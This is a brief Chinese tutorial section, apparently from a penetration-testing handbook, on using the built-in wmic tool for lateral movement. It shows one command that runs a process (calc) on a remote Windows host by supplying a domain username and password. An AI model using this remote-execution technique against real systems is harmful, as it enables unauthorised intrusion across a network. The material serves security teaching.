---
title: "4.2.2.2 利用 wmic 进行横向移动"
id: zhfly3424
---

#### 4.2.2.2 利用 wmic 进行横向移动

利用系统自带的工具 wmic 在目标主机上执行任意命令

```
wmic /node:192.168.19.178 /user:adtest\jeff1 /password:test@123 process call create "calc" 缺点:无法回显命令 
```

![image](../img/60d6a5f292fcebf567663ac9ef1ecf02.png)